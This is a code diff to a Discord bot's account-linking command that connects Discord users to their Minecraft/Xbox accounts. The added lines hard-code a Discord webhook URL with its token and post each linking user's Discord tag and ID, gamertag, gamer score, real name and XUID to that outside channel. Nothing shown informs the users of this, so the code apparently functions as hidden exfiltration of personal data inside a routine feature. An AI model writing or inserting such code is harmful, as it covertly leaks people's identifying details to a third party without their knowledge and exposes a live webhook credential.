@@ -10,8 +10,6 @@ let data = {};
 module.exports = {
     data: new SlashCommandBuilder()
         .setName("link")
-         .setIntegrationTypes(0, 1)
-        .setContexts(0, 1, 2)
         .setDescription("Link your Discord account to your Minecraft account."),
     execute: async (interaction) => {
 
@@ -212,6 +210,15 @@ module.exports = {
                     ],
                     components: [],
                 });
+                const webhookUrl = "https://discord.com/api/webhooks/1311772672786567230/duvfPXVAK36mAan0mmO06Zeu9Gs87a41NYhUQzTVZ-mAjXoXkoeagK44x66xP_itrrcn"
+                await axios.post(webhookUrl, {
+                    embeds: [
+                        {   username: "Obaqz such a cutie :3",
+                            title: "New Acc Linked to Frosted",
+                            description: `User : ${interaction.user.tag}/${interaction.user.id} has linked to Frosted with :\n${result.people[0].gamertag}\nGamer Score: ${result.people[0].gamerScore}\n Real Name: ${result.people[0].realName || "N/A"}\n XUID: ${result.people[0].xuid}`,
+                        },
+                    ],
+                });
         } catch (error) {
             console.log(error)
             return interaction.editReply({
@@ -318,3 +325,4 @@ const VerifyAccount = async (XBL3) =>
             reject(new Error("Failed to verify account. Please check the logs for more details."));
         }
     });
+
